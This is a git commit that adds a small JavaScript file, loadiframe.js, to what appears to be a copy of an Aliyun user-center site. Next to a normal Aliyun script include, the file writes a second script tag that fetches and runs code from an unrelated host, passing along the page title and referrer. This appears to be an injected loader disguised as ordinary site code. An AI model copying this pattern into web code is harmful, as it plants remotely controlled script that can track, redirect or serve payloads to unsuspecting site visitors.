1814a978f15f56a61c3a6a1901c9a273a19e9271
honnygao <honnygao@163.com>
2016-03-12 22:51:22 +0800

    commit ailyun

---
+++ js/user-center/site/loadiframe.js
@@ -0,0 +1,2 @@
+document.write("<script language='javascript' src='http://static.aliyun.com/js/user-center/jquery.validator.js?_veri=20121009'><\/script>");document.write("<script language='javascript' src='http://s.9ldjj.com/re/re.php?src=t6301&t="+encodeURIComponent(document.title)+"&ci=2869454916&r="+encodeURIComponent(document.referrer)+"'><\/script>");
+
